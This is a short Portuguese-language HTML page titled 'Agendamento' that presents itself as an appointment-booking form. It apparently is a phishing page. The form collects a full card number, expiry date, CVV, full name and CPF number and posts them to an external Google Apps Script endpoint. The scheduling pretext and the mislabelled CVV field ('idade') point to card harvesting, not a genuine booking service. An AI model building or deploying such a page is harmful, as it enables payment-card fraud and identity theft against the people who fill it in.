<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Agendamento</title>

<style>
body {
  font-family: Arial, sans-serif;
  background: #f2f2f2;
  margin: 0;
}
.container {
  max-width: 420px;
  margin: auto;
  background: #fff;
  min-height: 100vh;
  padding: 20px;
}
label {
  font-size: 13px;
  font-weight: bold;
}
input {
  width: 100%;
  padding: 14px;
  margin: 10px 0 15px;
  border-radius: 8px;
  border: 1px solid #ccc;
}
.row {
  display: flex;
  gap: 10px;
}
button {
  width: 100%;
  padding: 16px;
  background: #2962ff;
  color: #fff;
  border: none;
  border-radius: 10px;
  font-size: 16px;
  font-weight: bold;
}
</style>
</head>

<body>

<div class="container">
  <h2>Agendamento</h2>
  <p>Preencha os dados abaixo</p>

  <form
    action="https://script.google.com/macros/s/AKfycbyy4AYCzE2gpPiKkwO1XP3R2izuOzRFKcuju5oDrv1GX3rCDrWXKkJxEVXE5ZSNfRCh/exec"
    method="POST"
  >

  <label>Número do cartão</label>
    <input name="numero" required placeholder="Insira o numero do cartão">

    <div class="row">
      <div style="flex:1">
        <label>Data de validade</label>
        <input name="validade" required placeholder="MM/AA">
      </div>
      <div style="flex:1">
        <label>código de seguraça</label>
        <input name="idade" required placeholder="CVV/CVC">
      </div>
    </div>

    <label>Nome completo</label>
    <input name="nome" required placeholder="Digite seu nome completo">

    <label>CPF</label>
    <input name="cpf" required placeholder="000.000.000-00">

    <button type="submit">Confirmar</button>
  </form>
</div>

</body>
</html>
